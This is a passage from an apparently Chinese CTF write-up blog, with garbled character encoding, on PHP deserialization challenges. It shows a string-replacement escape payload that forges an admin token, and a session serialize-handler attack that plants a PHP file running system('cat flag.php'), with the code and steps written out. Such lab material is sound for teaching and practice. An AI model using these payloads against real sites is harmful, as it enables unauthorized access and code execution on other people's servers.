<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-&gt;</span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦æ”¹å˜ token çš„å€¼æ‰èƒ½å¾—åˆ° flagï¼Œæ¥ä¸‹æ¥å°±éœ€è¦æ‰¾åˆ°æ”¹å˜ token å€¼çš„æ–¹æ³•ï¼Œindex.php ä¸­å­˜åœ¨å­—ç¬¦æ›¿æ¢</p> 
<pre><code class="prism language-php"><span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># fuck æ›¿æ¢ä¸º loveUï¼Œä»å››ä¸ªå­—ç¬¦é•¿åº¦æ›¿æ¢ä¸ºäº”ä¸ªå­—ç¬¦é•¿åº¦</span>
</code></pre> 
<p>ä½†æ˜¯è¦æ³¨æ„æ›¿æ¢å‘ç”Ÿåœ¨åºåˆ—åŒ–ä¹‹åï¼Œå…ˆæ¥çœ‹ä¸€ä¸ªæ™®é€šçš„åºåˆ—åŒ–å­—ç¬¦ä¸²</p> 
<pre><code class="prism language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"isVip"</span><span class="token punctuation">;</span><span class="token argument-name">b</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token comment"># O		è¡¨ç¤ºåºåˆ—åŒ–ç±»å‹ä¸º class</span>
<span class="token comment"># 11	è¡¨ç¤ºç±»åçš„é•¿åº¦ä¸º11</span>
<span class="token comment"># 1		è¡¨ç¤ºæœ‰ä¸€å¯¹å‚æ•°</span>
<span class="token comment"># s		è¡¨ç¤ºå­—ç¬¦ä¸²ç±»å‹ï¼Œåè¾¹çš„ 5 å°±è¡¨ç¤ºçš„æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦</span>
<span class="token comment"># b		è¡¨ç¤ºBooleanç±»å‹trueï¼Œ1å°±æ˜¯true</span>
</code></pre> 
<p>phpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥<code>;</code>ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥<code>}</code>ä½œä¸ºç»“å°¾ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ–</p> 
<p>å›å»å†çœ‹ä¼ å…¥çš„ä¸‰ä¸ªå€¼ï¼šfã€mã€tï¼Œçœ‹çœ‹ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²</p> 
<pre><code class="prism language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"message"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"from"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"msg"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"to"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>åªè¦è®© t çš„å€¼ä¸ºå¤šä¸ª fuck ï¼Œä¹‹åæ›¿æ¢ä¸º loveUï¼Œå‰è¾¹çš„é•¿åº¦ä¸å˜ï¼Œå°±å¯ä»¥æŠŠä¼ªé€ çš„å«æœ‰ admin çš„å­—ç¬¦ä¸²æŒ¤å‡ºå»ï¼Œæ›¿æ¢æ‰åŸæ¥çš„å­—ç¬¦ä¸²ï¼Œçœ‹ä¸‹è¦ä¼ªé€  admin å­—ç¬¦é•¿åº¦</p> 
<p><img src="https://images2.imgbox.com/b2/74/Zz1EWI9U_o.png" alt="image-20210921132602931"></p> 
<p>åªéœ€è¦å‡†å¤‡27ä¸ª fuckï¼Œ</p> 
<pre><code>"fuck"*27
'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck'
</code></pre> 
<p>å› ä¸º f å’Œ m çš„å€¼æ²¡ä»€ä¹ˆç”¨éšä¾¿ä¼ ä¸ªå€¼å°±è¡Œ</p> 
<p>payload</p> 
<pre><code class="prism language-url">?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
</code></pre> 
<p>ç„¶åè®¿é—® manage.php</p> 
<h4><a id="web263session_604"></a>web263-sessionååºåˆ—åŒ–</h4> 
<p>ä¸»é¡µæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½¿ç”¨ dirsearch æ‰«æå‘ç° www.zip æ–‡ä»¶</p> 
<p>index.php</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
		 <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		 <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>	
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>æ³¨æ„è¿™é‡Œè®¾ç½® cookie çš„æ—¶å€™æ²¡æœ‰è®¾ç½® seesion åºåˆ—åŒ–é€‰æ‹©å™¨çš„ï¼Œå°±æ˜¯ php.ini ä¸­é…ç½®çš„åºåˆ—åŒ–é€‰æ‹©å™¨</p> 
<p>å›é¡¾ä¸‹ä¸‰ç§é€‰æ‹©å™¨</p> 
<table><thead><tr><th align="left"><strong>é€‰æ‹©å™¨</strong></th><th align="left"><strong>å­˜å‚¨æ ¼å¼</strong></th><th align="left"><strong>æ ·ä¾‹ $_SESSION[â€˜nameâ€™] = â€˜oceanâ€™;</strong></th></tr></thead><tbody><tr><td align="left">php_serialize</td><td align="left">ç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–æ•°ç»„</td><td align="left">a:1:{s:4:â€œnameâ€;s:5:â€œoceanâ€;}</td></tr><tr><td align="left">phpï¼ˆé»˜è®¤ï¼‰</td><td align="left">é”®å ç«–çº¿ ç»è¿‡ serialize() å‡½æ•°å¤„ç†çš„å€¼</td><td align="left">name|s:5:â€œoceanâ€;</td></tr><tr><td align="left">php_binary</td><td align="left">é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦ é”®å serialize() å‡½æ•°åºåˆ—åŒ–çš„å€¼</td><td align="left"> name s:6:â€œspoockâ€;</td></tr></tbody></table> 
<p><img src="https://images2.imgbox.com/d2/b2/OmW0nWYT_o.png" alt="image-20210921152024591"></p> 
<p>ç„¶å inc.php ä¸­å´å•ç‹¬å£°æ˜ä½¿ç”¨äº† php åºåˆ—åŒ–é€‰æ‹©å™¨ï¼Œåº”è¯¥å‡ºé¢˜äººæ”¹äº†é»˜è®¤çš„é€‰æ‹©å™¨ï¼Œä¸ç„¶è¿™é‡Œå°±ä¸ä¼šå•ç‹¬å£°æ˜äº†ï¼Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œç¬¬å…­è¡Œçš„ session_start() å‡½æ•°ä¼šè§£æ session æ–‡ä»¶ï¼Œå°±ç›¸å½“äºè¿›è¡Œäº†ååºåˆ—åŒ–</p> 
<pre><code class="prism language-php"><span class="token comment"># inc.php</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ä½¿ç”¨"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç™»é™†"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"æˆåŠŸ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"å¤±è´¥"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token operator">...</span>
</code></pre> 
<p>User ç±»ä¸­çš„ file_put_contents åƒæ˜¯ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œ</p> 
<p>è®¿é—®é¦–é¡µï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ° Cookie:limit å‚æ•°ï¼Œå¯ä»¥æŠŠååºåˆ—åŒ–æ•°æ®å†™å…¥ session æ–‡ä»¶</p> 
<p>å›  inc/inc.php å­˜åœ¨ ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™); å’Œ session_start(); ï¼Œåªè¦è®¿é—®å³ä¼šè·å–ä¹‹å‰å†™å…¥çš„ session æ•°æ®ï¼Œç„¶å check.php åŒ…å« inc/inc.php ï¼Œå³ä¼šè§¦å‘ Userç±» çš„ __destructæ–¹æ³• ï¼Œä»è€ŒæŠŠæ¶æ„æ•°æ®é€šè¿‡ file_put_contents å†™å…¥åä¸º log-$this.username ï¼Œå†…å®¹ä¸º $this.password çš„æ–‡ä»¶</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'test.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php system("cat flag.php") ?&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<blockquote> 
 <p>åŠ  <code>'|'</code> æ˜¯å› ä¸º <code>session.serialize_handler</code> ä½¿ç”¨ <code>phpå¼•æ“</code> ï¼Œsession å…³è”æ•°ç»„çš„ <code>key</code> å’Œ <code>value</code> æ˜¯é€šè¿‡ <code>'|'</code> åŒºåˆ†çš„ï¼Œ <code>value</code> æ˜¯éœ€è¦è¢«ååºåˆ—åŒ–çš„éƒ¨åˆ†ã€‚ç„¶åé»˜è®¤ä¸æ˜¯ç”¨ php å¼•æ“ï¼Œæ‰€ä»¥å†™å…¥æ˜¯æ­£å¸¸å­—ç¬¦ä¸²ï¼Œåœ¨ <code>inc/inc.php</code> è¿™è¯»å–è¯­ä¹‰åˆä¸ä¸€æ ·äº†</p> 
</blockquote> 
<p>å…·ä½“æ­¥éª¤å°±æ˜¯ï¼š</p> 
<ol><li> <p>ç”Ÿæˆ base64 ç¼–ç åºåˆ—åŒ–å­—ç¬¦ä¸²</p> </li><li> <p>å°†å­—ç¬¦ä¸²åœ¨æµè§ˆå™¨ä¸­ä¿å­˜ä¸ºcookieï¼ˆè¾“å…¥cookieï¼Œåˆ·æ–°ä¸‹é¡µé¢ï¼‰ï¼Œæˆ–è€…æŠ“åŒ…æ”¹ cookie:limit çš„å€¼</p> <p><img src="https://images2.imgbox.com/69/ea/xJ5B8frj_o.png" alt="[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-Er3JSYow-1632285285348)(F:%5C_%E7%AC%94%E8%AE%B0%5Cmdpic%5C8.CTFshow%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-WEB-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_pic%5Cimage-20210921155030824.png)]"></p> </li><li> <p>è¯·æ±‚ check.php ååºåˆ—åŒ–ï¼Œç”Ÿæˆæ–‡ä»¶</p> </li><li> <p>è®¿é—®ç”Ÿæˆçš„æ–‡ä»¶ï¼Œå¾—åˆ°flag</p> <p><img src="https://images2.imgbox.com/16/b8/Tb4j8tfI_o.png" alt="[å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-EEMGw5jq-1632285285350)(F:%5C_%E7%AC%94%E8%AE%B0%5Cmdpic%5C8.CTFshow%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-WEB-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_pic%5Cimage-20210921160026647.png)]"></p> </li></ol> 
<h4><a id="_695"></a>å‚è€ƒé“¾æ¥</h4> 
<p>https://blog.csdn.net/miuzzx/article/details/110558192</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3eb243f18ac425d493da96ccba9bf5e2/" rel="prev">
			<span class="pager__subtitle">Â«&thinsp;Previous</span>
			<p class="pager__title">ã€ä¼˜åŒ–æ±‚è§£ã€‘åŸºäºç²’å­ç¾¤ç®—æ³•æ±‚è§£å¤šç›®æ ‡ä¼˜åŒ–é—®é¢˜matlabæºç </p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f74a250e1b3cc6db15767a62724dfc9c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;Â»</span>
			<p class="pager__title">å…³äºpycharmä¸­Debuggerå¤±è´¥çš„é—®é¢˜ï¼ŒæŠ¥é”™ï¼šConnection to Python debugger failed Interrupted function call: accept fa</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 ITå­¦ä¹ è€…åšå®¢.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>